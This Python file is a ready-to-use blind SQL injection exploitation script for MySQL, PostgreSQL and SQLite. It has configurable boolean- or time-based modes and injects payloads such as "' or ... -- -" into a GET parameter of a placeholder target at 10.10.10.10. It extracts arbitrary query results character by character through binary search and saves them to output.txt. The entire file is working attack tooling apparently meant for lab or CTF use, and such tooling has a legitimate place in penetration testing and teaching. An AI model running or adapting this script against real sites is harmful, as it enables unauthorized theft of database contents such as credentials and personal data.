#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import sys
import time
import urllib3
import requests
import datetime
from enum import Enum


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Database(Enum):
    MySQL = 1
    PostgreSQL = 2
    SQLite = 3


class SQLiType(Enum):
    Boolean = 1
    Time = 2


######### CHANGE THIS #########
database = Database.MySQL
# database = Database.PostgreSQL
# database = Database.SQLite
sqlitype = SQLiType.Boolean
# sqlitype = SQLiType.Time
PRE = "' or"
POST = '-- -'
sleep_time = 2
###############################


if database == Database.PostgreSQL:
    SELECT_ROW = lambda row_num: f'limit 1 offset {row_num}'
    SUBSTRING = 'substring'
    ADD_SLEEP = lambda query: f'({query} AND 1=(select 1 from pg_sleep({sleep_time})))'
    ASCII = 'ascii'
    VERSION = 'version'
    DBNAME ='PostgreSQL'
elif database == Database.MySQL:
    SELECT_ROW = lambda row_num: f'limit {row_num},1'
    SUBSTRING = 'mid'
    ADD_SLEEP = lambda query: f'if({query},sleep({sleep_time}),0)'
    ASCII = 'ascii'
    VERSION = 'version'
    DBNAME = 'MySQL'
elif database == Database.SQLite:
    SELECT_ROW = lambda row_num: f'limit {row_num-1},1'
    SUBSTRING = 'substr'
    ADD_SLEEP = lambda query: f'{query} and 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB({sleep_time}00000000/2))))'
    ASCII = 'unicode'
    VERSION = 'sqlite_version'
    DBNAME = 'SQLite'
else:
    exit('invalid database type')
compare_value = None

# printable chars:
# 9, 10, 13, 11, 12
# 32-126
start_char = 9
end_char = 126

num_queries = 0


def set_compare_value():
    global compare_value
    query = f'{PRE} (select 1)=1 {POST}'
    measurements = []
    if sqlitype == SQLiType.Time:
        # this can be probably be done better
        for i in range(10):
            start = time.time_ns()
            send_req(query)
            end = time.time_ns()
            measurements.append(end - start)
        max_value = max(measurements)
        compare_value = max_value + (sleep_time * 1000000000)
        compare_value *= 0.85
    else:
        r = send_req(query)
        compare_value = int(r.headers['Content-Length'])


def send_req(payload):
    # CHANGE THIS
    global num_queries
    num_queries += 1
    # print(payload)
    params = {'pwn': payload}
    cookies = {}
    proxies = {}
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    url = 'http://10.10.10.10/index.php'
    r = requests.get(url,
                     params=params,
                     verify=False,
                     proxies=proxies,
                     allow_redirects=False,
                     cookies=cookies)
    return r


def check_if_true(r, time_elapsed):
    if sqlitype == SQLiType.Time:
        return time_elapsed >= compare_value
    else:
        # checking the content length is good enough for most cases
        return int(r.headers['Content-Length']) == compare_value


def query_equals_true(payload):
    if sqlitype == SQLiType.Time:
        payload = ADD_SLEEP(payload)
    payload = f'{PRE} {payload} {POST}'
    start = time.time_ns()
    r = send_req(payload)
    end = time.time_ns()
    time_elapsed = end - start
    return check_if_true(r, time_elapsed)


def get_column_name(query):
    match = re.search(r'select (.+?)( from|$)', query, re.IGNORECASE | re.MULTILINE)
    if match is None:
        exit('The query needs to start with SELECT')
    selected = match.group(1)
    match = re.search(r'.*? as (\w+)', selected, re.IGNORECASE)
    if match is not None:
        col_name = match.group(1)
    else:
        match = re.search(r'^[a-zA-Z_][a-zA-Z0-9_]*$', selected)
        if match is None:
            print('column name not recognized')
            print('make sure you only include one column')
            print('consider including an \'as aliasname\' on the target column')
            exit()
        col_name = selected
    return col_name


def get_length(query, num_row):
    if is_multirow(query):
        query = f'{query} {SELECT_ROW(num_row)}'

    # check that the query actually returns something
    null_test = f"EXISTS({query})"
    if query_equals_true(null_test) is False:
        print('the query did not return any results')
        return 0

    # check the it doesn't return NULL
    col_name = get_column_name(query)
    null_test = f"1 = (select count(1) from ({query}) as T where {col_name} IS NOT NULL)"
    if query_equals_true(null_test) is False:
        print('the query returns NULL')
        return 0

    # get the length of the response
    start = 0
    end = 5000  # this could be larger
    while start != end:
        middle = (end + start) // 2
        payload = f"(select length({col_name}) from ({query}) as T) > {middle}"
        if query_equals_true(payload):
            start = middle + 1
        else:
            end = middle
    return start


def get_num_rows(query):
    start = 1
    end = 5000  # this could be larger
    while start != end:
        middle = (end + start) // 2
        payload = f"(select count(*) from ({query}) as totalCount) > {middle}"
        if query_equals_true(payload):
            start = middle + 1
        else:
            end = middle
    return start


def is_multirow(query):
    match = re.search(r'select .*? from', query, re.IGNORECASE)
    return match is not None


def leak_query(query):
    set_compare_value()
    print(f'query: {query}')
    leaks = []
    multirow = is_multirow(query)
    if multirow:
        num_rows = get_num_rows(query)
    else:
        num_rows = 1
    print(f'num rows: {num_rows}\n')
    if num_rows == 0:
        return leaks
    try:
        for num_row in range(1, num_rows + 1):
            leak = ''
            length = get_length(query, num_row)
            for i in range(1, length + 1):
                start = start_char
                end = end_char
                while start != end:
                    middle = (end + start) // 2
                    # check if the ascii code of the character i in the row num_row is greater than midde
                    if multirow:
                        q = f'{query} {SELECT_ROW(num_row)}'
                    else:
                        q = query
                    payload = f"{ASCII}({SUBSTRING}(({q}), {i}, 1)) > {middle}"
                    if query_equals_true(payload):
                        start = middle + 1
                    else:
                        end = middle
                leak += chr(start)
                print(f'leaking row {num_row}: {leak}', end='\r')
            print(f'leaked row {num_row}: {leak} ')
        if length > 0:
            leaks.append(leak)
    except KeyboardInterrupt:
        print('')
    return leaks


def main():
    print('- -- Blind SQL injection script -- -\n')
    t = 'Boolean' if sqlitype == SQLiType.Boolean else 'Time'
    print(f'exploiting: {DBNAME}, {t} based')

    start = time.time()

    query = input('enter query: ')
    sys.stdout.buffer.write(b"\033[F")
    sys.stdout.buffer.write(b"\033[K")
    if query == '':
        query = f'select {SUBSTRING}({VERSION}(),1,10) as leak'
        print('using demo query\n')

    # exploit!
    leak = leak_query(query)
    if len(leak) > 0:
        with open('output.txt', 'a') as f:
            f.write(f'{query}\n')
            for i, entry in enumerate(leak):
                f.write(f'row {i+1}: {entry}\n')
            f.write('\n')
        print('[+] saved all rows in output.txt')
    else:
        print('[!] no output!')

    end = time.time()
    run_time = str(datetime.timedelta(seconds=round(end-start)))

    print(f'[i] completed after {num_queries} queries in {run_time}')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('')

